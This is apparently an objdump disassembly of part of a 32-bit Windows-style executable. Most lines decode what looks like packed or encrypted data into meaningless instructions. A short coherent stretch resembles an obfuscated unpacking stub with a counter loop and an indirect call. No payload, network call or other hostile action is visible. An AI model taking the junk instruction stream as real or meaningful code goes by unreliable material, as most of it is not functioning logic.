  40570a:	xchg   edi,eax
  40570b:	and    eax,0xe8a68b79
  405710:	xchg   esi,eax
  405711:	mov    al,0x22
  405713:	jmp    0xbaea:0xb4a4b68a
  40571a:	test   eax,0x4d938973
  40571f:	inc    edi
  405720:	jne    0x405724
  405722:	inc    ebp
  405723:	stc    
  405724:	jge    0x405764
  405726:	les    esi,FWORD PTR [eax-0xe]
  405729:	retf   0xd8b4
  40572c:	pop    ebp
  40572d:	and    al,0xe9
  40572f:	adc    BYTE PTR [ecx-0x381e0239],ch
  405735:	das    
  405736:	outs   dx,DWORD PTR ds:[esi]
  405737:	imul   edx,ebx,0xffffff8f
  40573a:	imul   edx,DWORD PTR [edi],0xffffffc3
  40573d:	scas   eax,DWORD PTR es:[edi]
  40573e:	pop    ss
  40573f:	aas    
  405740:	fdiv   DWORD PTR [eax+0x48]
  405743:	mov    dh,0x1f
  405745:	int3   
  405746:	shl    DWORD PTR [esi],0x62
  405749:	inc    ebx
  40574a:	pop    es
  40574b:	scas   al,BYTE PTR es:[edi]
  40574c:	mov    cl,0x39
  40574e:	leave  
  40574f:	xor    ah,bl
  405751:	(bad)  [edx+0x1d]
  405754:	stos   BYTE PTR es:[edi],al
  405755:	push   ds
  405756:	enter  0xade3,0x2a
  40575a:	inc    ecx
  40575b:	or     BYTE PTR [eax-0x51],0x86
  40575f:	push   edx
  405760:	shr    esp,cl
  405762:	iret   
  405763:	mov    ah,0xdb
  405765:	xor    ch,BYTE PTR [edi+0x4e]
  405768:	mov    al,ds:0x5cf527f6
  40576d:	mov    edx,DWORD PTR [ebp+0xaa656ce]
  405773:	scas   eax,DWORD PTR es:[edi]
  405774:	jl     0x405730
  405776:	shl    DWORD PTR [ebx],cl
  405778:	loope  0x405746
  40577a:	adc    BYTE PTR [ebx],0x5f
  40577d:	or     al,BYTE PTR [esi-0x50d4b0f9]
  405783:	xlat   BYTE PTR ds:[ebx]
  405784:	inc    edi
  405785:	sti    
  405786:	or     al,0xba
  405788:	sub    esi,edi
  40578a:	pop    es
  40578b:	jno    0x4057fd
  40578d:	ins    BYTE PTR es:[edi],dx
  40578e:	out    dx,eax
  40578f:	clc    
  405790:	adc    al,0x9a
  405792:	lea    eax,[edx-0x696bf6fd]
  405798:	retf   0xa01d
  40579b:	add    eax,0xb3cdcbc8
  4057a0:	pop    edx
  4057a1:	out    dx,eax
  4057a2:	jg     0x4057f9
  4057a4:	ds cmp al,0x33
  4057a7:	in     eax,dx
  4057a8:	mov    al,bl
  4057aa:	sub    BYTE PTR [ebp-0x4b],bh
  4057ad:	mov    ?,WORD PTR [ecx]
  4057af:	pop    esi
  4057b0:	sub    al,0x31
  4057b2:	sti    
  4057b3:	sub    cl,BYTE PTR [esi]
  4057b5:	cmp    DWORD PTR [esi-0x65],0xffffffeb
  4057b9:	mov    eax,0x54b75293
  4057be:	xchg   DWORD PTR [ebx],eax
  4057c0:	popa   
  4057c1:	pusha  
  4057c2:	inc    ebx
  4057c3:	mov    ah,0x12
  4057c5:	fsubr  QWORD PTR [ecx]
  4057c7:	push   cs
  4057c8:	pop    ds
  4057c9:	(bad)  [ecx+ebx*1-0x3f14dda0]
  4057d0:	mov    ebp,0x80f39abc
  4057d5:	(bad)  
  4057d6:	(bad)
  4057d9:	push   ecx
  4057da:	popa   
  4057db:	or     eax,0x2628f1ce
  4057e0:	xchg   DWORD PTR [ebp-0x3b],eax
  4057e3:	adc    al,0xfa
  4057e5:	xchg   esp,eax
  4057e6:	cmc    
  4057e7:	dec    edx
  4057e8:	js     0x4057ea
  4057ea:	sub    BYTE PTR [esi],0x1e
  4057ed:	jge    0x40581a
  4057ef:	cld    
  4057f0:	popf   
  4057f1:	dec    edx
  4057f2:	aad    0x32
  4057f4:	pmaxsw mm7,QWORD PTR [eax]
  4057f7:	add    al,0xc7
  4057f9:	jmp    0x40580e
  4057fb:	(bad)
  4057ff:	fwait
  405800:	mov    edx,0xb0cca1fd
  405805:	mov    ah,0x7f
  405807:	mov    ch,0x21
  405809:	fdiv   DWORD PTR [edx-0x4e]
  40580c:	and    DWORD PTR [ebx-0x72],edx
  40580f:	into   
  405810:	inc    edi
  405811:	or     ch,dl
  405813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405814:	sbb    dl,dh
  405816:	nop
  405817:	call   0x61b7:0xaeed4cc0
  40581e:	add    DWORD PTR [edx],esp
  405820:	sub    esp,DWORD PTR [edx+0x33e7809c]
  405826:	pusha  
  405827:	cmp    ebp,esi
  405829:	mov    WORD PTR [ebx+0xeab6e14],gs
  40582f:	out    dx,al
  405830:	cmp    al,0x23
  405832:	sbb    eax,0xff9433f3
  405837:	inc    edx
  405838:	sbb    ebx,DWORD PTR [edi+0x25]
  40583b:	xor    eax,0xcff293b1
  405840:	adc    DWORD PTR [ebp+0x66],edi
  405843:	shr    ebp,cl
  405845:	xor    BYTE PTR [edx],cl
  405847:	out    dx,eax
  405848:	mov    bl,0x22
  40584a:	adc    DWORD PTR [bp+si-0x21],eax
  40584e:	adc    ah,BYTE PTR [ecx]
  405850:	enter  0xfae5,0xd4
  405854:	call   0x832ef022
  405859:	inc    edx
  40585a:	or     esi,DWORD PTR [edi*1-0x41a46f70]
  405861:	inc    edx
  405862:	sub    dh,ch
  405864:	xchg   DWORD PTR [ebp-0x743eea13],ebp
  40586a:	ins    DWORD PTR es:[edi],dx
  40586b:	and    al,BYTE PTR [esi+0x1f32ade5]
  405871:	sub    eax,0xe11dcbbc
  405876:	shl    BYTE PTR [ebp+esi*2-0x3fccb755],0x30
  40587e:	shr    ah,0x95
  405881:	mov    BYTE PTR [ebp+0x5c],cl
  405884:	push   es
  405885:	adc    DWORD PTR [ebx+eax*8-0x7ed8e2ec],ebp
  40588c:	aad    0x6d
  40588e:	outs   dx,DWORD PTR ds:[esi]
  40588f:	adc    ecx,edi
  405891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405892:	or     eax,0x89c69da9
  405897:	mov    dh,BYTE PTR [ebx-0x7c]
  40589a:	add    dl,ch
  40589c:	je     0x40585f
  40589e:	repnz into 
  4058a0:	mov    ch,0xfb
  4058a2:	and    al,0x2c
  4058a4:	push   eax
  4058a5:	sub    ebx,DWORD PTR [ebx]
  4058a7:	aaa    
  4058a8:	std    
  4058a9:	dec    esp
  4058aa:	div    DWORD PTR [esi+eax*4]
  4058ad:	adc    BYTE PTR [ecx+0x4b2d3418],al
  4058b3:	call   0xb1800143
  4058b8:	js     0x40590c
  4058ba:	aad    0xee
  4058bc:	sub    eax,0x7be69ce0
  4058c1:	inc    ebx
  4058c2:	std    
  4058c3:	add    bh,BYTE PTR [edx+edi*2]
  4058c6:	jo     0x40592a
  4058c8:	std    
  4058c9:	push   ebx
  4058ca:	or     eax,0x40e23690
  4058cf:	sub    BYTE PTR [ebx-0x74],0xe4
  4058d3:	adc    al,0xd3
  4058d5:	xor    al,0xca
  4058d7:	repnz std 
  4058d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058da:	sahf   
  4058db:	nop
  4058dc:	xchg   ebx,eax
  4058dd:	xchg   esp,eax
  4058de:	mov    esi,0xe974d004
  4058e3:	and    BYTE PTR [ebx+0x5680b0cf],cl
  4058e9:	inc    esi
  4058ea:	iret   
  4058eb:	mov    ebx,0x9efcc45
  4058f0:	jmp    0x194b:0xf088d68e
  4058f7:	aam    0xf8
  4058f9:	sbb    ebx,DWORD PTR [ebx]
  4058fb:	cmp    eax,0xeac98529
  405900:	sub    DWORD PTR [ecx+0x30a55b8c],0x21d88aa3
  40590a:	arpl   bp,cx
  40590c:	add    BYTE PTR [esi+0x18],bl
  40590f:	jg     0x4058ab
  405911:	fucom  st(2)
  405913:	imul   ebp,DWORD PTR [ecx+esi*2-0x61],0xf4a0e26a
  40591b:	shr    edx,0xc5
  40591e:	ficom  WORD PTR [edi+0x13337ab1]
  405924:	mov    ds:0xe77be4db,eax
  405929:	pusha  
  40592a:	mov    esi,0x4858f9fb
  40592f:	scas   eax,DWORD PTR es:[edi]
  405930:	adc    ebp,0x39
  405933:	inc    edx
  405934:	inc    esp
  405935:	out    0xaf,eax
  405937:	jb     0x40597e
  405939:	jg     0x4058ec
  40593b:	(bad)  
  40593c:	fcomp  QWORD PTR [edx]
  40593e:	jb     0x4058ff
  405940:	xor    al,0x68
  405942:	into   
  405943:	pop    ss
  405944:	in     eax,dx
  405945:	dec    esp
  405946:	fild   WORD PTR [edx]
  405948:	cmp    al,0x29
  40594a:	xor    eax,0x12ece3d0
  40594f:	in     eax,0x26
  405951:	and    al,0xa0
  405953:	mov    dh,dh
  405955:	cmp    al,BYTE PTR [eax+0xf6c2a2a]
  40595b:	pop    ss
  40595c:	jno    0x405946
  40595e:	std    
  40595f:	clc    
  405960:	sub    BYTE PTR [eax],0xa4
  405963:	push   0xffffff8c
  405965:	pop    esp
  405966:	mov    esp,0x71e1a603
  40596b:	fidiv  WORD PTR [eax]
  40596d:	mov    ds:0x395014d9,al
  405972:	mov    ebx,0x514edaef
  405977:	mov    bh,bh
  405979:	push   es
  40597a:	sar    BYTE PTR [ebp-0x31f67541],1
  405980:	xchg   ebx,eax
  405981:	loopne 0x40595f
  405983:	scas   al,BYTE PTR es:[edi]
  405984:	mov    ebx,0xf676044e
  405989:	(bad)  [edi-0x1d53f9d]
  40598f:	inc    esi
  405990:	sar    DWORD PTR [edx-0x2bfce3f6],0xa8
  405997:	fist   DWORD PTR [esp+esi*2-0x13]
  40599b:	test   eax,0x53a9018
  4059a0:	pop    esi
  4059a1:	pand   mm5,QWORD PTR ds:0x9ecc6c08
  4059a8:	pop    ss
  4059a9:	mov    esp,0x1486aea2
  4059ae:	add    esi,DWORD PTR [eax*8+0x4da0e4c7]
  4059b5:	in     al,0x2c
  4059b7:	push   edi
  4059b8:	mov    bl,0xff
  4059ba:	ins    BYTE PTR es:[edi],dx
  4059bb:	cmp    DWORD PTR [esi+0x69ac4c4f],ebp
  4059c1:	int3   
  4059c2:	fdivr  QWORD PTR [ecx]
  4059c4:	jg     0x405989
  4059c6:	jns    0x405a32
  4059c8:	test   BYTE PTR [esi+0x4300ac12],bh
  4059ce:	lods   eax,DWORD PTR ds:[esi]
  4059cf:	outs   dx,DWORD PTR ds:[esi]
  4059d0:	aam    0xbe
  4059d2:	stos   DWORD PTR es:[edi],eax
  4059d3:	mov    ecx,0x3668d444
  4059d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d9:	pop    eax
  4059da:	mov    dh,0x8e
  4059dc:	sub    eax,0x2785618
  4059e1:	dec    edx
  4059e2:	and    eax,0xefc20363
  4059e8:	(bad)  
  4059e9:	(bad)  
  4059ea:	loop   0x405996
  4059ec:	fild   WORD PTR [ebx+0x2e]
  4059ef:	paddsb mm5,mm1
  4059f2:	jp     0x4059b1
  4059f4:	shl    DWORD PTR [ebp-0x35],cl
  4059f7:	dec    eax
  4059f8:	mov    gs,WORD PTR ds:0x2b941b67
  4059fe:	jbe    0x4059c2
  405a00:	ret    
  405a01:	sar    BYTE PTR [edx+0x66],cl
  405a04:	push   ebx
  405a05:	push   edi
  405a06:	mov    eax,ds:0x37c4a3ca
  405a0b:	sub    eax,0x2e61f2c6
  405a10:	not    DWORD PTR [edi-0x58b12000]
  405a16:	adc    eax,0x8bd99660
  405a1b:	dec    esi
  405a1c:	sbb    eax,0x4d303c7c
  405a21:	jnp    0x405a43
  405a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a24:	ss push ecx
  405a26:	jp     0x405a56
  405a28:	sbb    al,BYTE PTR [edi]
  405a2a:	shl    DWORD PTR [esi+0x76],1
  405a2d:	out    dx,eax
  405a2e:	jbe    0x4059fb
  405a30:	dec    edx
  405a31:	ins    BYTE PTR es:[edi],dx
  405a32:	lock xchg BYTE PTR [ebp+0x494798e3],cl
  405a39:	jo     0x405a70
  405a3b:	(bad)  
  405a3c:	frstor [edi+0x7439fc0a]
  405a42:	ficom  WORD PTR [esi+0x77]
  405a45:	mov    edx,0x4d0a71b
  405a4a:	sti    
  405a4b:	test   eax,0xccb4e763
  405a50:	out    dx,eax
  405a51:	into   
  405a52:	int    0x7c
  405a54:	or     DWORD PTR [edi],edi
  405a56:	push   ss
  405a57:	cmc    
  405a58:	push   ebx
  405a59:	in     al,dx
  405a5a:	and    al,0xb4
  405a5c:	pop    esp
  405a5d:	mov    ah,0x9e
  405a5f:	jle    0x405a22
  405a61:	or     al,0xbb
  405a63:	das    
  405a64:	cld    
  405a65:	or     edi,DWORD PTR [esi+0x7d]
  405a68:	mov    al,ds:0xc89358c0
  405a6d:	cmp    edi,DWORD PTR [edi]
  405a6f:	cmp    edi,DWORD PTR ds:0xd0ce9d05
  405a75:	xchg   BYTE PTR [eax],dl
  405a77:	pop    esp
  405a78:	xchg   ecx,eax
  405a79:	into   
  405a7a:	out    0xdc,al
  405a7c:	ror    dl,cl
  405a7e:	packssdw mm5,QWORD PTR [eax]
  405a81:	add    ch,0x19
  405a84:	jo     0x405b02
  405a86:	test   BYTE PTR [ecx-0x1fe0ea1],ch
  405a8c:	push   edi
  405a8d:	mov    ebx,0xc150a363
  405a92:	inc    ebp
  405a93:	jno    0x405b04
  405a95:	jle    0x405a7a
  405a97:	xor    DWORD PTR [ebp-0x3b5089ce],edx
  405a9d:	ss cs mov bl,0x32
  405aa1:	fcomi  st,st(5)
  405aa3:	jnp    0x405a9b
  405aa5:	and    eax,0xe2891f58
  405aaa:	and    BYTE PTR [ebx],al
  405aac:	jmp    0x2fff9be9
  405ab1:	inc    ecx
  405ab2:	xor    cl,BYTE PTR [eax-0x73879384]
  405ab8:	sbb    eax,0x33e3602
  405abd:	mov    DWORD PTR [eax-0x29bff529],ebx
  405ac3:	int    0x7
  405ac5:	push   esi
  405ac6:	mov    cl,0xe4
  405ac8:	adc    edi,DWORD PTR [esi+0x6c48389d]
  405ace:	mov    esi,0x2b79e44e
  405ad3:	mov    DWORD PTR [ebp*8-0x668b106d],esp
  405ada:	inc    eax
  405adb:	leave  
  405adc:	push   eax
  405add:	add    ch,BYTE PTR [esi+esi*8]
  405ae0:	push   edx
  405ae1:	adc    edi,DWORD PTR [edi-0x75]
  405ae4:	adc    BYTE PTR [ebx],cl
  405ae6:	push   edi
  405ae7:	mov    ds:0x427c1391,al
  405aec:	inc    ebx
  405aed:	and    DWORD PTR [edx],esp
  405aef:	sbb    al,bh
  405af1:	push   eax
  405af2:	cmp    ecx,DWORD PTR [eax+0x1e]
  405af5:	mov    ebp,DWORD PTR [ebx]
  405af7:	hlt    
  405af8:	or     al,0x6f
  405afa:	inc    ebp
  405afb:	(bad)  
  405afc:	and    eax,DWORD PTR [ebp+0x1d]
  405aff:	adc    al,0x93
  405b01:	lods   eax,DWORD PTR ds:[esi]
  405b02:	mov    eax,0x40f7cf45
  405b07:	sub    eax,0x474872a8
  405b0c:	dec    edx
  405b0d:	(bad)  [ebx+0x2d]
  405b10:	adc    cl,BYTE PTR [ebp+0x6e0d2551]
  405b16:	loop   0x405b01
  405b18:	int3   
  405b19:	add    dh,BYTE PTR [ecx*8-0x4dc07fcb]
  405b20:	jl     0x405b19
  405b22:	and    al,0x9b
  405b24:	or     DWORD PTR ds:0x37b2e450,esi
  405b2a:	int    0x19
  405b2c:	mov    eax,ds:0xdf2f72f9
  405b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b32:	sub    dl,BYTE PTR [esp+ebp*2+0x4d8b032e]
  405b39:	lock sub DWORD PTR ds:0x42a266,0x42a2e2
  405b44:	xor    eax,esi
  405b46:	add    DWORD PTR ds:0x42a2ea,0x138
  405b50:	xor    ecx,esi
  405b52:	lea    ecx,[eax+ecx*1+0x64e5e2]
  405b59:	and    DWORD PTR ds:0x42a26a,0x0
  405b63:	xor    eax,eax
  405b65:	or     eax,DWORD PTR ds:0x42a26a
  405b6b:	inc    eax
  405b6c:	mov    ds:0x42a26a,eax
  405b71:	cmp    DWORD PTR ds:0x42a26a,0x7
  405b78:	jge    0x405bae
  405b7e:	jmp    0x405b89
  405b83:	call   DWORD PTR ds:0x42a3da
  405b89:	cmp    DWORD PTR ds:0x42a26a,0x6
  405b90:	jne    0x405ba1
  405b96:	mov    eax,ds:0x42a26a
  405b9b:	inc    eax
  405b9c:	mov    ds:0x42a26a,eax
  405ba1:	cmp    DWORD PTR ds:0x42a26a,0x11
  405ba8:	jb     0x405b63
  405bae:	mov    eax,DWORD PTR [ebp-0xc]
  405bb1:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  405bbb:	xor    edx,edx
  405bbd:	or     DWORD PTR ds:0x42a29e,0x16dc
  405bc7:	div    ecx
  405bc9:	or     eax,ecx
  405bcb:	mov    eax,DWORD PTR [ebp-0x8]
  405bce:	xor    ecx,ecx
  405bd0:	xor    ecx,DWORD PTR ds:0x42a292
  405bd6:	sbb    DWORD PTR ds:0x42a2fa,ecx
  405bdc:	mov    ecx,DWORD PTR [ebp-0x10]
  405bdf:	xor    eax,esi
  405be1:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  405beb:	xor    ecx,esi
  405bed:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  405bf7:	sub    eax,ecx
  405bf9:	cmp    edx,eax
  405bfb:	jmp    0x407f54
  405c00:	mov    esp,0x8265841a
  405c05:	loope  0x405ba5
  405c07:	add    BYTE PTR [eax+0x74],0x97
  405c0b:	es inc ecx
  405c0d:	xor    dh,ah
  405c0f:	std    
  405c10:	or     edi,DWORD PTR [ecx]
  405c12:	add    DWORD PTR [ebx-0x7c7ca1b9],0xffffff9c
  405c19:	or     dh,al
  405c1b:	sub    DWORD PTR [ebp+ebx*8-0x69ff3d4],ebx
  405c22:	hlt    
  405c23:	sbb    WORD PTR [edx-0x6a1d5856],ax
  405c2a:	inc    esi
  405c2b:	mov    ch,0x9a
  405c2d:	stos   DWORD PTR es:[edi],eax
  405c2e:	sbb    eax,0x9b57a51d
  405c33:	and    eax,0xa7550842
  405c38:	fwait
  405c39:	inc    ecx
  405c3a:	pop    edi
  405c3b:	mov    BYTE PTR [eax-0x158d4945],cl
  405c41:	mov    dl,BYTE PTR [edx+eiz*2-0x292e510f]
  405c48:	push   ds
  405c49:	int    0x24
  405c4b:	pusha  
  405c4c:	xor    DWORD PTR [ebp+0x7e],ecx
  405c4f:	je     0x405cc9
  405c51:	xchg   ecx,eax
  405c52:	lahf   
  405c53:	jg     0x405c87
  405c55:	outs   dx,DWORD PTR ds:[esi]
  405c56:	xchg   BYTE PTR [ebx],cl
  405c58:	mov    cl,0x21
  405c5a:	scas   eax,DWORD PTR es:[edi]
  405c5b:	pop    edx
  405c5c:	sahf   
  405c5d:	xor    eax,0xe9d66117
  405c62:	adc    DWORD PTR [esi-0x59f7116f],esp
  405c68:	mov    DWORD PTR [ecx+0xf08fa3c],0x6036adc1
  405c72:	sti    
  405c73:	dec    ebp
  405c74:	pop    ebx
  405c75:	push   0x48
  405c77:	mov    dl,0xad
  405c79:	(bad)  
  405c7a:	(bad)  
  405c7c:	dec    edx
  405c7d:	(bad)  
  405c7e:	loopne 0x405c9c
  405c80:	pop    ebp
  405c81:	loop   0x405cd8
  405c83:	jae    0x405ce8
  405c85:	mov    ecx,0x21a6eec9
  405c8a:	mov    ch,0xe6
  405c8c:	shl    BYTE PTR [edx],1
  405c8e:	or     bh,dl
  405c90:	mov    ch,BYTE PTR ds:0x2155a448
  405c96:	dec    edx
  405c97:	xor    esi,DWORD PTR [edi]
  405c99:	jo     0x405caf
  405c9b:	xor    DWORD PTR [ecx],eax
  405c9d:	xchg   edx,eax
  405c9e:	mov    cl,0x2d
  405ca0:	fild   QWORD PTR [esi-0x11916c75]
  405ca6:	jae    0x405ce0
  405ca8:	jns    0x405cfe
  405caa:	dec    ebp
  405cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cac:	add    ecx,ecx
  405cae:	xor    dl,BYTE PTR [eax-0x2368970]
  405cb4:	outs   dx,BYTE PTR ds:[esi]
  405cb5:	pop    ebx
  405cb6:	mov    ecx,0x795fd85c
  405cbb:	inc    ebp
  405cbc:	imul   esp,ebx,0xf
  405cbf:	ins    DWORD PTR es:[edi],dx
  405cc0:	mov    eax,ds:0xaf3ca453
  405cc5:	aas    
  405cc6:	sbb    DWORD PTR [esi-0x69647f0b],0x11b2aab0
  405cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd1:	jl     0x405c78
  405cd3:	dec    edi
  405cd4:	mov    dl,0xd0
  405cd6:	data16 cmp al,0xff
  405cd9:	aaa    
  405cda:	jo     0x405d3e
  405cdc:	mov    ebx,0x8ab8ed6b
  405ce1:	cld    
  405ce2:	repz inc edi
  405ce4:	leave  
  405ce5:	sub    al,0xd2
  405ce7:	in     al,0xec
  405ce9:	into   
  405cea:	shl    DWORD PTR [ecx-0x1cff2936],1
  405cf0:	std    
  405cf1:	(bad)  
  405cf3:	loopne 0x405d2e
  405cf5:	cmp    bl,BYTE PTR [ebp+0x691dec08]
  405cfb:	sbb    eax,0x3574385e
  405d00:	ss inc eax
  405d02:	xchg   BYTE PTR [ebx+0x684c20c6],cl
  405d08:	loopne 0x405cbd
  405d0a:	sub    ah,BYTE PTR [eax+ebx*2]
  405d0d:	fdiv   QWORD PTR [edi]
  405d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d10:	xchg   esi,eax
  405d11:	imul   ecx,DWORD PTR [edi+0xaf40a2d],0xc335dab1
  405d1b:	sub    ch,BYTE PTR [eax-0x39fd7386]
  405d21:	shl    DWORD PTR [edi],1
  405d23:	das    
  405d24:	fidiv  WORD PTR [ecx+0x6e06721d]
  405d2a:	loope  0x405d4c
  405d2c:	mov    gs:0x7a936e56,eax
  405d32:	retf   
  405d33:	sbb    BYTE PTR [edi-0x5f15ed54],bh
  405d39:	cli    
  405d3a:	push   esp
  405d3b:	fmul   QWORD PTR [esi]
  405d3d:	je     0x405d62
  405d3f:	xchg   BYTE PTR ds:0xb0a95860,bl
  405d45:	call   0xa1298ece
  405d4a:	xchg   edx,eax
  405d4b:	jo     0x405dad
  405d4d:	lods   al,BYTE PTR ds:[esi]
  405d4e:	rol    ecx,1
  405d50:	and    dh,BYTE PTR [eax+ebp*4+0x427d1a28]
  405d57:	sbb    eax,ebp
  405d59:	(bad)  [edx+0x5fb6af43]
  405d5f:	push   ecx
  405d60:	ins    DWORD PTR es:[edi],dx
  405d61:	out    dx,eax
  405d62:	lahf   
  405d63:	scas   eax,DWORD PTR es:[edi]
  405d64:	into   
  405d65:	shr    BYTE PTR [ebp+esi*2+0x7d4688bd],cl
  405d6c:	dec    eax
  405d6d:	in     al,0xcc
  405d6f:	mov    al,BYTE PTR [eiz*8+0x5e1dfd07]
  405d76:	mov    ds,WORD PTR [edx+eax*2-0x12e61b20]
  405d7d:	sub    eax,0xc9b9c51e
  405d82:	mov    ecx,0x650c1d9
  405d87:	ja     0x405d5a
  405d89:	mov    DWORD PTR [esi+0x599a7f8a],edi
  405d8f:	addr16 xchg ecx,eax
  405d91:	push   ecx
  405d92:	div    BYTE PTR [edi]
  405d94:	out    dx,eax
  405d95:	neg    BYTE PTR [edi+edx*1]
  405d98:	test   BYTE PTR [edx-0x2aad96b9],dl
  405d9e:	mov    eax,ds:0x4e7d7524
  405da3:	pop    edi
  405da4:	repnz fist DWORD PTR ds:0x47c2508c
  405dab:	or     al,0xac
  405dad:	imul   eax,DWORD PTR [eax],0x26e1da88
  405db3:	sbb    ah,ah
  405db5:	shl    BYTE PTR [ecx],0xbe
  405db8:	ins    BYTE PTR es:[edi],dx
  405db9:	inc    ebx
  405dba:	sbb    BYTE PTR [edi-0x80],dh
  405dbd:	jb     0x405d99
  405dbf:	push   cs
  405dc0:	dec    esi
  405dc1:	cmp    bl,ah
  405dc3:	jge    0x405e31
  405dc5:	fstp   TBYTE PTR [esi-0x1ccc2fa1]
  405dcb:	and    BYTE PTR [ecx+0x1e],ah
  405dce:	or     eax,0xfccf777d
  405dd3:	or     BYTE PTR [ebx-0x75],ah
  405dd6:	mov    edi,ebx
  405dd8:	sti    
  405dd9:	dec    ebx
  405dda:	pop    es
  405ddb:	adc    BYTE PTR [ebp+0x15],dh
  405dde:	add    al,0xf7
  405de0:	add    BYTE PTR [ecx],dl
  405de2:	outs   dx,BYTE PTR ds:[esi]
  405de3:	inc    ebp
  405de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405de5:	jb     0x405d90
  405de7:	sbb    DWORD PTR [ebx-0x352781ea],0x14
  405dee:	sub    edx,DWORD PTR [edx+0x22c0a666]
  405df4:	sbb    bl,BYTE PTR [esi+0x38afe0ba]
  405dfa:	mov    dh,0xd5
  405dfc:	stc    
  405dfd:	std    
  405dfe:	ins    DWORD PTR es:[edi],dx
  405dff:	jns    0x405e32
  405e01:	imul   eax,DWORD PTR [edi+edx*2+0x2d8001da],0xffffffa2
  405e09:	aas    
  405e0a:	push   esi
  405e0b:	test   DWORD PTR [ebp-0xde185ea],ebx
  405e11:	ret    
  405e12:	aam    0x50
  405e14:	imul   ebx,DWORD PTR [esi+eax*4+0x2a460626],0xe173e49a
  405e1f:	(bad)  
  405e20:	cmp    ebx,ebx
  405e22:	mov    ebx,0x43e92804
  405e27:	in     eax,dx
  405e28:	int3   
  405e29:	pop    eax
  405e2a:	out    0xa7,eax
  405e2c:	inc    esp
  405e2d:	sub    esp,esi
  405e2f:	loope  0x405ddb
  405e31:	xchg   esp,eax
  405e32:	sahf   
  405e33:	int    0xd7
  405e35:	sub    ebx,DWORD PTR [eax-0x384eda3a]
  405e3b:	pop    es
  405e3c:	pop    ebp
  405e3d:	cli    
  405e3e:	pop    eax
  405e3f:	ficom  WORD PTR [eax+0x59838092]
  405e45:	push   cs
  405e46:	icebp  
  405e47:	mov    eax,cs
  405e49:	cld    
  405e4a:	test   DWORD PTR [ebp-0x4f],0xeb12a4e0
  405e51:	push   eax
  405e52:	pop    edi
  405e53:	push   esp
  405e54:	das    
  405e55:	mov    bh,0xed
  405e57:	jge    0x405ed6
  405e59:	retf   0x8233
  405e5c:	std    
  405e5d:	aad    0x30
  405e5f:	mov    ds:0xf9b10018,al
  405e64:	sbb    BYTE PTR cs:[eax+edi*4+0x70],ch
  405e69:	outs   dx,BYTE PTR ds:[esi]
  405e6a:	mov    ds,esp
  405e6c:	jbe    0x405e2e
  405e6e:	dec    eax
  405e6f:	ins    DWORD PTR es:[edi],dx
  405e70:	outs   dx,DWORD PTR ds:[esi]
  405e71:	ja     0x405ef1
  405e73:	call   0xd875:0x9ef63304
  405e7a:	shl    BYTE PTR [esi],cl
  405e7c:	dec    edx
  405e7d:	add    BYTE PTR [eax-0x66d40c2f],0x93
  405e84:	scas   eax,DWORD PTR es:[edi]
  405e85:	mov    dh,0x42
  405e87:	fist   WORD PTR [edx]
  405e89:	in     eax,0x8
  405e8b:	adc    edx,esp
  405e8d:	js     0x405ee3
  405e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e90:	sub    DWORD PTR [edx+0x3062290e],ecx
  405e96:	test   eax,0x12ae554c
  405e9b:	sbb    BYTE PTR [ecx-0x3e4905c0],0x28
  405ea2:	cmp    dl,BYTE PTR [ecx-0x61d87b2f]
  405ea8:	push   esp
  405ea9:	fdiv   QWORD PTR [edi+0xa]
  405eac:	mov    edx,0x6533320d
  405eb1:	popa   
  405eb2:	mov    esp,0xbcc5a879
  405eb7:	cmp    eax,0xa68570a8
  405ebc:	dec    edi
  405ebd:	iret   
  405ebe:	sub    BYTE PTR ds:0x981159af,0x7d
  405ec5:	pop    ebx
  405ec6:	ror    DWORD PTR [esi-0x20],cl
  405ec9:	icebp  
  405eca:	push   eax
  405ecb:	xor    DWORD PTR [edi+ecx*8+0x34],edx
  405ecf:	sub    DWORD PTR [ebp+0x4b],esi
  405ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ed3:	dec    eax
  405ed4:	and    esi,eax
  405ed6:	add    BYTE PTR [ebx],0x64
  405ed9:	xchg   ecx,eax
  405eda:	adc    DWORD PTR [edi+0xd],eax
  405edd:	inc    ebx
  405ede:	jne    0x405ebe
  405ee0:	lea    ebp,[edx+ebp*1]
  405ee3:	sbb    ebp,DWORD PTR [edi-0x376e97d1]
  405ee9:	ror    DWORD PTR [edi+0x610ba88a],0xe9
  405ef0:	sbb    eax,0xa0c64bd2
  405ef5:	mov    BYTE PTR [ebx-0x12],al
  405ef8:	mov    ch,bh
  405efa:	(bad)  
  405efc:	mov    DWORD PTR [edi+ebx*1],edi
  405eff:	push   esi
  405f00:	jno    0x405e82
  405f02:	retf   
  405f03:	inc    edx
  405f04:	jmp    0x405f85
  405f06:	(bad)  
  405f07:	pop    edi
  405f08:	and    ecx,DWORD PTR [ebx+ebx*1-0x80]
  405f0c:	je     0x405f6a
  405f0e:	out    0x83,al
  405f10:	(bad)  
  405f12:	retf   0x3c48
  405f15:	and    eax,DWORD PTR [edi+ebp*2-0x549a6905]
  405f1c:	jno    0x405ed6
  405f1e:	and    eax,0xf6df0dba
  405f23:	in     eax,dx
  405f24:	popa   
  405f25:	and    BYTE PTR [eax+0x20510453],bl
  405f2b:	add    BYTE PTR [esi+0x47e3c07b],dl
  405f31:	sbb    dh,bh
  405f33:	sub    DWORD PTR [esi-0x616ce7a],0x5f13366c
  405f3d:	xor    ecx,eax
  405f3f:	jb     0x405faf
  405f41:	std    
  405f42:	xchg   ebx,eax
  405f43:	jbe    0x405f39
  405f45:	in     al,0xbc
  405f47:	sti    
  405f48:	dec    ebp
  405f49:	out    0x73,eax
  405f4b:	jle    0x405f11
  405f4d:	clc    
  405f4e:	ja     0x405f04
